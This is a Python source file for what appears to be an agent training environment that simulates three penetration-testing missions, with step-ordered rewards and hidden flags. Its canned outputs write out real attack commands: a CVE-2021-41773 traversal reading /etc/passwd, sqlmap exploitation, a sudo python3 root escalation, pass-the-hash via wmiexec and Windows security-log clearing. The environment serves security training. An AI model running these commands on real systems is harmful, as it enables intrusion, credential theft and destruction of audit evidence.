from __future__ import annotations

from threading import Lock
from typing import Any, Dict, Generic, List, Optional, TypeVar

try:
    from openenv.core.env_server import Environment
except Exception:
    A = TypeVar("A")
    O = TypeVar("O")
    S = TypeVar("S")

    class Environment(Generic[A, O, S]):
        pass

try:
    from models import RedTeamAction, RedTeamObservation, RedTeamState
except Exception:
    from ..models import RedTeamAction, RedTeamObservation, RedTeamState


STEP_REWARDS = {
    "easy": {"base": 0.12, "completion_bonus": 0.06},
    "medium": {"base": 0.10, "completion_bonus": 0.05},
    "hard": {"base": 0.07, "completion_bonus": 0.04},
}
CHAIN_BONUS = 0.01
PENALTY_WRONG_ORDER = -0.05


def safe_reward(r: float) -> float:
    """
    Return a reward value STRICTLY inside (0.0, 1.0).

    This is called on EVERY reward value before it enters an observation.
    No reward ever touches 0.0 or 1.0.
    """
    try:
        v = float(r)
    except (TypeError, ValueError):
        return 0.10
    if v != v:
        return 0.10
    v = max(0.10, min(0.90, v))
    if v <= 0:
        return 0.10
    if v >= 1:
        return 0.90
    return round(v, 3)


TASKS: List[Dict[str, Any]] = [
    {
        "name": "Web Application Recon",
        "difficulty": "easy",
        "target_ip": "192.168.10.5",
        "required_steps": ["scan", "enumerate", "exploit"],
        "scenario": "Apache 2.4.29 with CVE-2021-41773 path traversal, exposed /admin panel",
        "hidden_flag": "FLAG{w3b_app_0wn3d_192.168.10.5}",
    },
    {
        "name": "SQLi to RCE",
        "difficulty": "medium",
        "target_ip": "10.10.20.15",
        "required_steps": ["scan", "enumerate", "exploit", "escalate"],
        "scenario": "Node.js app with unsanitized SQL inputs + weak sudo policy (python3 NOPASSWD)",
        "hidden_flag": "FLAG{sql_t0_r00t_10.10.20.15}",
    },
    {
        "name": "APT Multi-Stage Compromise",
        "difficulty": "hard",
        "target_ip": "172.16.50.0/24",
        "required_steps": ["scan", "enumerate", "exploit", "escalate", "c2", "cleanup"],
        "scenario": "Corporate network, Log4Shell on DMZ, lateral movement via pass-the-hash to DC",
        "hidden_flag": "FLAG{apt_full_chain_172.16.50.0}",
    },
]


ACTION_OUTPUTS: Dict[int, Dict[str, str]] = {
    0: {
        "scan": "nmap -sV -p- 192.168.10.5\n22/tcp open ssh OpenSSH 7.6p1\n80/tcp open http Apache httpd 2.4.29\n443/tcp open ssl/http Apache 2.4.29\nFinding: legacy Apache build likely vulnerable to CVE-2021-41773.",
        "enumerate": "gobuster dir -u http://192.168.10.5 -w /usr/share/seclists/Discovery/Web-Content/common.txt\n/admin (Status: 200)\n/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd (Status: 200)\nFinding: path traversal primitive confirmed with readable sensitive files.",
        "exploit": "curl --path-as-is http://192.168.10.5/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nPost-exploitation: web root credentials extracted from /var/www/html/.env.",
    },
    1: {
        "scan": "nmap -sC -sV 10.10.20.15\n22/tcp open ssh OpenSSH 8.2p1\n3000/tcp open http Node.js Express\n3306/tcp open mysql MySQL 5.7\nFinding: exposed app and database service indicate attack surface for injection.",
        "enumerate": "sqlmap -u 'http://10.10.20.15:3000/login?user=admin&pass=test' --batch\nParameter 'user' appears to be injectable\nDBMS: MySQL >= 5.0\nDatabase dump includes hash for app_admin and local service credentials.",
        "exploit": "sqlmap --os-shell simulation\nwhoami\nnodeapp\ncat /etc/sudoers.d/nodeapp\nnodeapp ALL=(ALL) NOPASSWD:/usr/bin/python3\nExploit path confirmed for local privilege escalation.",
        "escalate": "sudo /usr/bin/python3 -c 'import os; os.system(\"/bin/bash -p -c id\")'\nuid=0(root) gid=0(root) groups=0(root)\nRoot shell simulation established on 10.10.20.15.",
    },
    2: {
        "scan": "nmap -sV 172.16.50.0/24\n172.16.50.10 dmz-web log4j app\n172.16.50.20 fileserver smb signing disabled\n172.16.50.30 dc01 ldap/kerberos\nFinding: DMZ host with vulnerable Java service and flat east-west reachability.",
        "enumerate": "ldapsearch and bloodhound-style graphing simulation\nService account svc_backup reuses NTLM hash across hosts\nDomain trust map indicates privileged path to dc01 via fileserver pivot.",
        "exploit": "log4shell payload sent to dmz-web\nRCE callback received on 172.16.50.10\nMeterpreter-like foothold created; harvested lsass material queued for relay.",
        "escalate": "pass-the-hash simulation against fileserver and dc01\nwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99\nAdministrator context acquired on dc01.",
        "c2": "Cobalt Strike team server beacon check-in\nBeacon ID 4242 active, jitter 35%, sleep 45s\nEncrypted C2 channel established with delegated token operations.",
        "cleanup": "wevtutil cl Security && wevtutil cl System (simulated)\nTemporary payloads shredded, persistence keys removed, operator notes archived.\nBlue-team detection surface reduced for controlled exercise closure.",
    },
}


class RedTeamPentestEnvironment(Environment[RedTeamAction, RedTeamObservation, RedTeamState]):
    SUPPORTS_CONCURRENT_SESSIONS = True
    _shared_lock = Lock()
    _global_episode_counter: int = 0
    _default_task_index: int = 0
    _session_states: Dict[str, Dict[str, Any]] = {}
    _default_session_key = "__default__"

    def __init__(self) -> None:
        with self._shared_lock:
            self.task_index = int(self.__class__._default_task_index) % len(TASKS)
            self.episode = int(self.__class__._global_episode_counter)
            self.current_task = TASKS[self.task_index]
            self.completed_steps = []
            self.mistakes = 0

    def _resolve_session_key(self, episode_id: Optional[str], kwargs: Dict[str, Any]) -> str:
        raw_id = episode_id if episode_id is not None else kwargs.get("episode_id")
        if raw_id is None:
            return self.__class__._default_session_key
        normalized = str(raw_id).strip()
        return normalized if normalized else self.__class__._default_session_key

    def _ensure_session(self, session_key: str) -> Dict[str, Any]:
        session = self.__class__._session_states.get(session_key)
        if session is None:
            session = {
                "task_index": int(self.__class__._default_task_index) % len(TASKS),
                "episode": int(self.__class__._global_episode_counter),
                "completed_steps": [],
                "mistakes": 0,
            }
            self.__class__._session_states[session_key] = session
        return session

    def _hydrate_from_session(self, session: Dict[str, Any]) -> None:
        self.task_index = int(session["task_index"]) % len(TASKS)
        self.current_task = TASKS[self.task_index]
        self.episode = int(session["episode"])
        self.completed_steps = session["completed_steps"]
        self.mistakes = int(session["mistakes"])

    @property
    def state(self) -> RedTeamState:
        required = self.current_task["required_steps"]
        raw_progress = len(self.completed_steps) / len(required) if required else 0.1
        progress = max(0.1, min(0.9, raw_progress))
        return RedTeamState(
            episode=self.episode,
            task=self.current_task["name"],
            progress=round(progress, 3),
        )

    def _make_observation(self, current_state: str, output: str, reward: float, done: bool) -> RedTeamObservation:
        return RedTeamObservation(
            target_ip=self.current_task["target_ip"],
            current_state=current_state,
            output=output,
            difficulty=self.current_task["difficulty"],
            reward=safe_reward(reward),
            done=done,
        )

    def reset(self, seed: Optional[int] = None, episode_id: Optional[str] = None, **kwargs: Any) -> RedTeamObservation:
        with self._shared_lock:
            session_key = self._resolve_session_key(episode_id, kwargs)
            session = self._ensure_session(session_key)

            if "task_index" in kwargs:
                session["task_index"] = int(kwargs["task_index"]) % len(TASKS)
            else:
                session["task_index"] = int(session["task_index"]) % len(TASKS)

            if session_key == self.__class__._default_session_key:
                self.__class__._default_task_index = int(session["task_index"])

            session["completed_steps"] = []
            session["mistakes"] = 0

            self.__class__._global_episode_counter += 1
            session["episode"] = self.__class__._global_episode_counter

            self._hydrate_from_session(session)

            # Avoid unbounded growth from arbitrary client-provided session ids.
            if len(self.__class__._session_states) > 2048:
                keys = [k for k in self.__class__._session_states if k != self.__class__._default_session_key]
                for key in keys[:512]:
                    self.__class__._session_states.pop(key, None)

        briefing = (
            f"Mission: {self.current_task['name']}\n"
            f"Target: {self.current_task['target_ip']}\n"
            f"Scenario: {self.current_task['scenario']}\n"
            f"Required sequence: {' -> '.join(self.current_task['required_steps'])}\n"
            "Objective: Execute each phase in order, collect evidence, and complete the chain."
        )
        return self._make_observation("BRIEFING", briefing, safe_reward(0.10), False)

    def _valid_action_output(self, action_name: str, done: bool) -> str:
        task_outputs = ACTION_OUTPUTS.get(self.task_index, {})
        base = task_outputs.get(action_name, f"Executed {action_name} successfully.")
        if done:
            return f"{base}\nObjective complete. Capture: {self.current_task['hidden_flag']}"
        return base

    def step(self, action: RedTeamAction, **kwargs: Any) -> RedTeamObservation:
        with self._shared_lock:
            session_key = self._resolve_session_key(None, kwargs)
            session = self._ensure_session(session_key)
            self._hydrate_from_session(session)

            if not getattr(self, "current_task", None):
                return self.reset(**kwargs)

            action_name = getattr(action, "action", None)
            if action_name is None:
                session["mistakes"] = int(session["mistakes"]) + 1
                self._hydrate_from_session(session)
                return self._make_observation(
                    "INVALID",
                    "Malformed action payload. Expected one of: scan, enumerate, exploit, escalate, c2, cleanup.",
                    safe_reward(0.10),
                    False,
                )

            required_steps = self.current_task["required_steps"]

            if action_name not in required_steps:
                session["mistakes"] = int(session["mistakes"]) + 1
                self._hydrate_from_session(session)
                return self._make_observation(
                    "INVALID",
                    f"Action '{action_name}' is not part of this mission plan. Follow: {' -> '.join(required_steps)}.",
                    safe_reward(0.10),
                    False,
                )

            if action_name in self.completed_steps:
                return self._make_observation(
                    "REPEAT",
                    f"Action '{action_name}' was already completed. Continue with the next required phase.",
                    safe_reward(0.10),
                    False,
                )

            expected_action = required_steps[len(self.completed_steps)]
            if action_name != expected_action:
                session["mistakes"] = int(session["mistakes"]) + 1
                self._hydrate_from_session(session)
                return self._make_observation(
                    "ORDER_VIOLATION",
                    f"Out-of-order action. Expected '{expected_action}' but received '{action_name}'.",
                    safe_reward(PENALTY_WRONG_ORDER),
                    False,
                )

            session["completed_steps"].append(action_name)
            self._hydrate_from_session(session)
            difficulty = self.current_task["difficulty"]
            base = STEP_REWARDS[difficulty]["base"]

            # Chain bonus scales with progression when the chain is clean.
            step_position = len(self.completed_steps)
            reward = base + (CHAIN_BONUS * step_position if self.mistakes == 0 else 0)

            done = len(self.completed_steps) == len(required_steps)
            if done:
                reward += STEP_REWARDS[difficulty]["completion_bonus"]

            return self._make_observation(
                "SUCCESS" if done else "IN_PROGRESS",
                self._valid_action_output(action_name, done),
                safe_reward(reward),
                done,
            )

    def close(self) -> None:
        return None